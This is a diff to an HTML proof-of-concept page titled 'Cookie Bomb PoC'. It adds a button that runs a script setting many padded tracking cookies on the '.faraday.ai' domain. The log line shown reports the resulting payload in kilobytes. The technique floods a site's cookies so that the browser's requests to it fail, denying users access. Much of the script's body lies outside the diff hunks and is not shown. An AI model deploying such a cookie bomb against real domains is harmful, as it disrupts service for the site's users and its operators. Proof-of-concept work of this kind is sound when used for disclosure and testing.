@@ -2,7 +2,10 @@
 <html>
 <head><title>Cookie Bomb PoC</title></head>
 <body>
+<button onclick="runCookieBomb()">Run Cookie Bomb</button>
+
 <script>
+function runCookieBomb() {
 (function cookieBombTracking({
   domain = '.faraday.ai',
   path = '/',
@@ -33,6 +36,7 @@
   });
   console.log(`[cookieBombTracking] Set ${trackingNames.length} tracking cookies (+${copiesPerName} pads each), ~${((trackingNames.length*(1+copiesPerName)*sizeBytes)/1024).toFixed(1)} KB payload.`);
 })();
+}
 </script>
 </body>
 </html>
